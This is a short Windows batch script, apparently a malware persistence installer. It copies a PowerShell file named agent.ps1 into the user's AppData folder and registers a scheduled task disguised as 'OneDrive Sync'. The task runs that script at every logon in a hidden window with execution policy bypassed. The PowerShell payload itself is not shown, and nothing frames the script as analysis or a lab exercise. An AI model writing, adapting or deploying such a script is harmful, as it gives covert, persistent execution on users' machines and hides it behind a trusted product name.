@echo off
copy /y "%~dp0agent.ps1" "%APPDATA%\agent.ps1" >nul
schtasks /create /tn "OneDrive Sync" /tr "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File %APPDATA%\agent.ps1" /sc onlogon /f
